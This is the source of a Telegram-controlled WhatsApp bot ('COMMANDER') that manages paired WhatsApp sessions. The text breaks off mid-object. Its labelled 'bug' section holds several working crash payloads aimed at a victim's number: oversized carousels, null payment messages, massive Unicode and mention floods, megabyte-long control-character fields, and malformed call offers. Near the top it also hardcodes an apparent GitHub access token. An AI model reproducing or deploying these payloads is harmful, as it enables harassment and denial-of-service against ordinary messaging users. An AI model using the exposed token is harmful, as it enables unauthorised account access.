const { Bot, InlineKeyboard, InputFile } = require("grammy");
const fs = require("fs");
const path = require("path");
const { exec } = require("child_process");
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  useSingleFileAuthState,
  initInMemoryKeyStore,
  fetchLatestBaileysVersion,
  fetchLatestWaWebVersion,
  makeWASocket: WASocket,
  AuthenticationState,
  BufferJSON,
  relayMessage,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  generateWAMessage,
  generateWAMessageContent,
  WANode,
  WAMetric,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  DisconnectReason,
  MediaConnInfo,
  encodeWAMessage,
  ReconnectMode,
  AnyMessageContent,
  waChatKey,
  makeCacheableSignalKeyStore,
  WAProto,
  proto,  
  BaileysError
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const crypto = require("crypto");
const { Boom } = require("@hapi/boom");
const axios = require("axios");
const config = require("./config");
const chalk = require("chalk");
const thumbnail = fs.existsSync("./storage/thumbnail.jpg")
  ? fs.readFileSync("./storage/thumbnail.jpg")
  : null;
const CHANNEL_ID = config.chanelid;
const GROUP_ID = config.chatgrupid;
const accesDb = JSON.parse(fs.readFileSync("./storage/access.json"));
const resDb = JSON.parse(fs.readFileSync("./storage/resellers.json"));
const bugProcesses = new Map();
const {
  isOwner,
  isReseller,
  isFreeMode,
  hasAccess,
  addReseller,
  removeReseller
} = require("./controlSystem/control");
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const bot = new Bot(config.telegramBotToken);
const control = require("./controlSystem/control.js");
const cooldown = require("./controlSystem/cooldown.js");
const cooldownModule = require("./controlSystem/sumemek.js");
const repo_gh = "ahmedabwnlhylh45-lab/comander";
const nama_file = "comander_db.json";
const path_ghp = "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";



let client;


/**
 * Custom Console Logging System
 * Optimized & Styled for better debugging.
 * Modified and Maintained by: COMMANDER (2026)
 * * لا تَأسَفَنَّ عَلَى غَدرِ الزَّمانِ لَطَالَمَا .. رَقَصَت عَلَى جُثَثِ الأُسُودِ كِلابُ
 * لا تَحسَبَنَّ بِرَقصِهَا تَعلُو عَلَى أَسيَادِهَا .. تَبقَى الأُسُودُ أُسُوداً وَالكِلابُ كِلابُ
 */


const log = {
  success: (msg) => console.log(chalk.green.bold("✓ ") + chalk.white(msg)),
  error: (msg) => console.log(chalk.red.bold("✗ ") + chalk.white(msg)),
  warning: (msg) => console.log(chalk.yellow.bold("⚠ ") + chalk.white(msg)),
  info: (msg) => console.log(chalk.blue.bold("ℹ ") + chalk.white(msg)),
  loading: (msg) => console.log(chalk.magenta.bold("⏳ ") + chalk.white(msg)),
  user: (msg) => console.log(chalk.cyan.bold("👤 ") + chalk.white(msg)),
  whatsapp: (msg) => console.log(chalk.green.bold("📱 ") + chalk.white(msg)),
  telegram: (msg) => console.log(chalk.blue.bold("✈️ ") + chalk.white(msg)),
  system: (msg) => console.log(chalk.gray.bold("⚙️  ") + chalk.white(msg)),
};

/**
 * إدارة النسخ الاحتياطي وحفظ الجلسات محلياً
 * [ نظام آمن ومستقل لكل مستخدم ]
 */


const waClients = {};
const sessionRoot = path.join(".", "session");
if (!fs.existsSync(sessionRoot))
  fs.mkdirSync(sessionRoot, {
    recursive: true,
  });

function getSessionPathForUser(userId) {
  return path.join(sessionRoot, String(userId));
}
async function checkSessionExistsForUser(userId) {
  try {
    const p = getSessionPathForUser(userId);
    await fs.promises.access(p);
    return true;
  } catch {
    return false;
  }
}
async function deleteSessionForUser(userId) {
  try {
    const p = getSessionPathForUser(userId);
    if (waClients[userId]?.sock) {
      try {
        waClients[userId].sock.end();
      } catch (e) {
        log.warning(`Failed to close socket for ${userId}: ${e.message}`);
      }
      delete waClients[userId];
    }
    await fs.promises.rm(p, {
      recursive: true,
      force: true,
    });
    log.success(`WhatsApp session for user ${userId} deleted successfully`);
    return true;
  } catch (err) {
    log.error(`Failed to delete session for ${userId}: ${err.message}`);
    return false;
  }
}
async function clearAllSessions() {
  try {
    const folders = fs.existsSync(sessionRoot)
      ? fs.readdirSync(sessionRoot)
      : [];
    for (const f of folders) {
      try {
        if (waClients[f]?.sock) {
          waClients[f].sock.end();
        }
        delete waClients[f];
      } catch (e) {
        log.warning(`Failed to close socket for ${f}: ${e.message}`);
      }
    }
    for (const f of folders) {
      const p = path.join(sessionRoot, f);
      try {
        await fs.promises.rm(p, { recursive: true, force: true });
      } catch (e) {
        log.warning(`Failed to delete session folder ${f}: ${e.message}`);
      }
    }

    log.success("All WhatsApp sessions cleared successfully");
    return true;
  } catch (err) {
    log.error(`Failed to clear all sessions: ${err.message}`);
    return false;
  }
}
async function reconnectExistingSessions() {
  try {
    const sessionFolders = fs.existsSync(sessionRoot)
      ? fs.readdirSync(sessionRoot)
      : [];

    if (sessionFolders.length > 0) {
      log.loading(
        `Found ${sessionFolders.length} saved WhatsApp sessions. Auto-reconnecting...`
      );

      for (const folder of sessionFolders) {
        const userId = folder;
        try {
          await initWhatsappForUser(userId, false);
          log.whatsapp(`Auto-reconnecting session for user ${userId}`);
        } catch (err) {
          log.warning(
            `Failed to auto-reconnect session for ${userId}: ${err.message}`
          );
        }
      }
    } else {
      log.info("No saved WhatsApp sessions found. Starting fresh.");
    }
  } catch (err) {
    log.error(`Error during auto-reconnect: ${err.message}`);
  }
}

/*
 * ⚡ [COMMANDER_NET CORE V2.0] ⚡
 * --------------------------------------------------
 * › SYSTEM: WhatsApp Multi-Session Controller
 * › ACCESS: ROOT / TOTAL CONTROL VIA TELEGRAM
 * › STATUS: Cleansed, Secured, and Fully Owned.
 * › BY: OVERLORD COMMANDER (2026) 
 * --------------------------------------------------
 */

async function initWhatsappForUser(
  telegramUserId,
  notifyUser = true,
  retryCount = 0
) {
  const MAX_RETRIES = 3;
  const RECONNECT_DELAY = 2000;
  const userId = String(telegramUserId);
  const sessionPath = getSessionPathForUser(userId);

  try {
    if (!fs.existsSync(sessionPath))
      fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

    const sock = makeWASocket({
      logger: pino({ level: "silent" }),
      auth: state,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      syncFullHistory: false,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      keepAliveIntervalMs: 30000,
      retryRequestDelayMs: 1000,
      messageRetryMap: new Map(),
      shouldIgnoreJid: (jid) => false,
      getMessage: async (key) => {
        return { conversation: "Message not available" };
      },
      patchMessageBeforeSending: (message) => {
        const requiresPatch = !!(
          message.buttonsMessage ||
          message.templateMessage ||
          message.listMessage
        );
        if (requiresPatch) {
          message = {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadataVersion: 2,
                  deviceListMetadata: {},
                },
                ...message,
              },
            },
          };
        }
        return message;
      },
      printQRInTerminal: false,
      queryChatCount: 0,
    });

    sock.ev.on("creds.update", saveCreds);

    waClients[userId] = {
      sock,
      status: "connecting",
      sessionPath,
      reconnecting: false,
      lastActivity: Date.now(),
      messageCount: 0,
    };

    const connectionMonitor = setInterval(() => {
      if (waClients[userId]?.status === "open") {
        const timeSinceLastActivity =
          Date.now() - (waClients[userId].lastActivity || Date.now());
        if (timeSinceLastActivity > 120000) {
          log.info(`[Monitor] Sending keep-alive for ${userId}`);
          waClients[userId].lastActivity = Date.now();
        }
      }
    }, 60000);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update || {};

      try {
        if (connection === "close") {
          clearInterval(connectionMonitor);
          const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
          const disconnectReason =
            DisconnectReason[reason] || reason || "unknown";

          log.warning(`WA (${userId}) disconnected: ${disconnectReason}`);
          waClients[userId].status = "closed";

          if (
            reason === DisconnectReason.loggedOut ||
            reason === 401 ||
            reason === 403
          ) {
            log.warning(
              `Number for user ${userId} logged out / banned. Deleting session...`
            );
            try {
              if (waClients[userId]?.sock?.end) {
                waClients[userId].sock.end();
              }
            } catch (e) {
              log.warning(`Error closing socket for ${userId}: ${e.message}`);
            }

            await deleteSessionForUser(userId).catch(() => {});
            delete waClients[userId];

            try {
              await bot.api.sendMessage(
                telegramUserId,
                "🚫 *WhatsApp session removed*\nYour WhatsApp session was logged out or banned. Please re-pair using /reqpair.",
                { parse_mode: "Markdown" }
              );
            } catch (err) {
              log.warning(`Failed to notify user ${userId}: ${err.message}`);
            }
          } else {
            if (!waClients[userId]?.reconnecting && retryCount < MAX_RETRIES) {
              waClients[userId].reconnecting = true;
              log.loading(
                `Reconnecting WA for user ${userId} (attempt ${
                  retryCount + 1
                }/${MAX_RETRIES})...`
              );

              try {
                if (waClients[userId]?.sock?.end) {
                  waClients[userId].sock.end();
                }
                await new Promise((r) => setTimeout(r, 500));
              } catch (e) {
                log.warning(
                  `Error closing socket before reconnect for ${userId}: ${e.message}`
                );
              }

              setTimeout(() => {
                if (waClients[userId]) {
                  waClients[userId].reconnecting = false;
                  initWhatsappForUser(
                    telegramUserId,
                    notifyUser,
                    retryCount + 1
                  );
                }
              }, RECONNECT_DELAY);
            } else if (retryCount >= MAX_RETRIES) {
              log.error(
                `Failed to reconnect WA for user ${userId} after ${MAX_RETRIES} attempts.`
              );
              clearInterval(connectionMonitor);
              try {
                if (waClients[userId]?.sock?.end) {
                  waClients[userId].sock.end();
                }
                await deleteSessionForUser(userId).catch(() => {});
                delete waClients[userId];

                await bot.api.sendMessage(
                  telegramUserId,
                  "🚫 *WhatsApp session deleted*\nUnable to reconnect after 3 attempts. Please pair again using /reqpair.",
                  { parse_mode: "Markdown" }
                );
              } catch (err) {
                log.error(
                  `Failed to delete session for ${userId}: ${err.message}`
                );
              }
            }
          }
        } else if (connection === "open") {
          waClients[userId].status = "open";
          waClients[userId].lastActivity = Date.now();
          log.whatsapp(
            `✅ WhatsApp Connected Successfully for user ${userId}!`
          );

          const { pairingMessageId, waitMessageId } = waClients[userId] || {};
          try {
            if (pairingMessageId)
              await bot.api
                .deleteMessage(telegramUserId, pairingMessageId)
                .catch(() => {});
            if (waitMessageId)
              await bot.api
                .deleteMessage(telegramUserId, waitMessageId)
                .catch(() => {});
            waClients[userId].pairingMessageId = null;
            waClients[userId].waitMessageId = null;
          } catch (e) {
            log.warning(`Failed cleaning messages for ${userId}: ${e.message}`);
          }

          if (notifyUser) {
            try {
              await bot.api.sendMessage(
                telegramUserId,
                `✅ *WhatsApp paired successfully.*\nYour session is ready to use.`,
                { parse_mode: "Markdown" }
              );
            } catch (err) {
              log.warning(
                `Failed to notify pairing success for ${userId}: ${err.message}`
              );
            }
          }
        }
      } catch (e) {
        log.error(
          `Error in connection.update for user ${userId}: ${e.message}`
        );
      }
    });
    sock.ev.on("connection.error", (error) => {
      log.error(`Socket error for ${userId}: ${error.message}`);
    });

    return sock;
  } catch (err) {
    log.error(`Failed to init WhatsApp for user ${userId}: ${err.message}`);
    return null;
  }
}

async function requestPairingCodeForUser(telegramUserId, phone) {
  try {
    const userId = String(telegramUserId);
    let client = waClients[userId]?.sock;

    if (!client) {
      if (!waClients[userId]) {
        await initWhatsappForUser(userId, false);
        await new Promise((r) => setTimeout(r, 2000));
        client = waClients[userId]?.sock;
      } else {
        client = waClients[userId]?.sock;
      }
    }

    if (!client) throw new Error("Failed to create WA client for pairing");

    if (typeof client.requestPairingCode === "function") {
      const code = await client.requestPairingCode(phone);
      return code;
    } else {
      throw new Error("Pairing code API not available");
    }
  } catch (err) {
    throw err;
  }
}



/* * Function bug 🦠
 * Modified & Owned by: COMMANDER
 */
async function hardfix1(client, X) {
let CardsX = [];

for (let r = 0; r < 1000; r++) {
CardsX.push({
body: { text: '' },
header: {
title: '',
imageMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
mimetype: "image/jpeg",
fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
fileLength: "98",
height: 4,
width: 4,
mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
mediaKeyTimestamp: "1749728782"
},
hasMediaAttachment: true
},
nativeFlowMessage: {
messageParamsJson: '',
buttons: [
{
name: "voice_call",
buttonParamsJson: {}
}
]
}
});
}

let msg = await generateWAMessageFromContent(X, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
body: { text: '👑 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗘𝗥 👑' },
carouselMessage: {
cards: CardsX
},
contextInfo: {
participant: "0@s.whatsapp.net",
quotedMessage: {},
remoteJid: "@s.whatsapp.net"
}
}
}
}
}, {});

await client.relayMessage(X, {
groupStatusMessageV2: {
message: msg.message,
},
},
{ 
messageId: msg.key.id, 
participant: { jid: X },
}
);
}

async function hardfix3(client, X) {
  let cards = [];
  
  for (let r = 0; r < 1000; r++) {
  cards.push({
    body: proto.Message.InteractiveMessage.Body.fromObject({ text: " " }),
    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " " }),
    header: proto.Message.InteractiveMessage.Header.fromObject({
      title: " ",
      hasMediaAttachment: true,
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
        fileLength: "18352",
        height: 720,
        width: 1280,
        mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
        fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
        directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1737281900",
        jpegThumbnail:
          "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
        scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
        scanLengths: [3537, 10557, 1905, 2353],
        midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
      },
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
      buttons: [],
      }),
    });
  }

  let msg = await generateWAMessageFromContent(X,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 3,
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
            footer: proto.Message.InteractiveMessage.Footer.create({ text: "\u0003" }),
            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [...cards],
            }),
          }),
        },
      },
    },
    {}
  );
  
  await client.relayMessage(X, {
    groupStatusMessageV2: {
      message: msg.message,
     },
    },
    { 
      messageId: msg.key.id,
      participant: { jid: X },
    }
  );
}

async function crashSendPaymentNPE(client, X) {
  await client.relayMessage(X, {
    sendPaymentMessage: {
      noteMessage: null,
      requestMessageKey: undefined,
      background: null,
      contextInfo: {
        externalAdReply: null
      }
    }
  }, {
    participant: { jid: X },
    quoted: null
  });
}

async function fungadjigelo(client, X) {
  await client.relayMessage(X, {
    sendPaymentMessage: {
      noteMessage: null,
      requestMessageKey: undefined,
      background: null,
      contextInfo: {
        externalAdReply: null
      }
    }
  }, {
    participant: { jid: X },
    quoted: null
  });
}
                            
async function audiocall(client, X) {
    try {

        let devices = (
            await client.getUSyncDevices([X], false, false)
        ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

        await client.assertSessions(devices);

        let createMutex = () => {
            let map = {};
            return {
                mutex(key, fn) {
                    map[key] ??= { task: Promise.resolve() };
                    map[key].task = (async prev => {
                        try { await prev; } catch {}
                        return fn();
                    })(map[key].task);
                    return map[key].task;
                }
            };
        };

        let mutexManager = createMutex();
        let mergeBuffer = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
        let encodeMsg = client.encodeWAMessage?.bind(client);

        client.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
            if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

            let patched = await (client.patchMessageBeforeSending?.(message, recipientJids) ?? message);

            let mapped = Array.isArray(patched)
                ? patched
                : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

            let { id: meId, lid: meLid } = client.authState.creds.me;
            let decodedLidUser = meLid ? jidDecode(meLid)?.user : null;
            let shouldIncludeDeviceIdentity = false;

            let nodes = await Promise.all(mapped.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);
                let isOwnUser = targetUser === ownPnUser || targetUser === decodedLidUser;
                let isSelf = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !isSelf) msg = dsmMessage;

                let bytes = mergeBuffer(encodeMsg ? encodeMsg(msg) : encodeWAMessage(msg));

                return mutexManager.mutex(jid, async () => {
                    let { type, ciphertext } = await client.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });
                    if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            }));

            return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
        };

        let { nodes: destinations, shouldIncludeDeviceIdentity } =
            await client.createParticipantNodes(
                devices,
                { conversation: "y" },
                { count: '0' }
            );


        let callNode = {
            tag: "call",
            attrs: {
                to: X,
                id: client.generateMessageTag(),
                from: client.user.id
            },
            content: [{
                tag: "offer",
                attrs: {
                    "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                    "call-creator": client.user.id
                },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    { tag: "net", attrs: { medium: "3" } },
                    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {}, content: destinations },
                    ...(shouldIncludeDeviceIdentity
                        ? [{
                            tag: "device-identity",
                            attrs: {},
                            content: encodeSignedDeviceIdentity(client.authState.creds.account, true)
                        }]
                        : [])
                ]
            }]
        };

        await client.sendNode(callNode);

    } catch (err) {
        console.error("audiocall error:", err);
    }
}

async function crashandro(client, X) {
  const cardsX = [];
  for (let r = 0; r < 15; r++) {
    cardsX.push({
      header: {
        title: "",
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
          fileLength: "289511",
          seconds: 15,
          mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
          caption: "\u0000",
          height: 640,
          width: 640,
          fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
          directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1743848703",
          streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
          thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
          thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
          thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        },
        hasMeidiaAttachment: true,
      },
      body: {
        text: "",
      },
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000),
      },
    });
  }

  const msg = generateWAMessageFromContent(
    X,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "🦠</🧬⃟༑⌁𝗫 𝗜 𝗡 𝗦 𝗢 𝗢" +
              "ꦽ".repeat(25000) +
              "ោ៝".repeat(20000) +
              "@5".repeat(50000),
            },
            carouselMessage: {
              cardsX,
              messageVersion: 1,
            },
            contextInfo: {
              participant: X,
              mentionedJid: [
                "13529292@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () => "1" + Math.floor(Math.random() * 5000000)
                ),
              ],
              remoteJid: "X",
              forwadingScore: 100,
              isForwaded: true,
              stanzaId: "123456789ABCDEF",
              businessMessageForwardInfo: {
                businessOwnerJid: X,
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 18144000,
                },
              },
            },
          },
        },
      },
    },
    {}
  );
  
  await client.relayMessage(X, msg.message, {
    participant: { jid: X },
    messageId: msg.key.id
  });
  
  const X2 = generateWAMessageFromContent(
    X,
    {
      viewOnceMessage: {
        message: {
          groupInviteMessage: {
            groupJid: "13535516@g.us",
            inviteCode: "XxX",
            inviteExpiration: "1",
            groupName: "🦠</🧬⃟༑⌁𝗫 𝗜 𝗡 𝗦 𝗢 𝗢" +
              "ꦽ".repeat(25000) +
              "ោ៝".repeat(20000) +
              "@5".repeat(50000),
            caption: "\n",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
          },
        },
      },
    },
    {}
  );
  
  await client.relayMessage(X, X2.message, {
    messageId: X2.key.id,
    participant: { jid: X },
  });
}

async function delayhigh(client, X) {
  const payload = generateWAMessageFromContent(X, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await client.relayMessage(X, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    },
    { 
      messageId: payload.key.id, 
      participant: { jid: X },
    }
  );
  
  const payload2 = generateWAMessageFromContent(X, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await client.relayMessage(X, {
    groupStatusMessageV2: {
      message: payload2.message,
     },
    },
    { 
      messageId: payload2.key.id, 
      participant: { jid: X },
    }
  );
  
  const StickerPayload = generateWAMessageFromContent(X, {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
          fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
          mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
          mimetype: "image/webp",
          height: 9999,
          width: 9999,
          directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
          fileLength: 12260,
          mediaKeyTimestamp: "1743832131",
          isAnimated: false,
          stickerSentTs: Date.now(),
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          contextInfo: {
            participant: X,
            mentionedJid: [
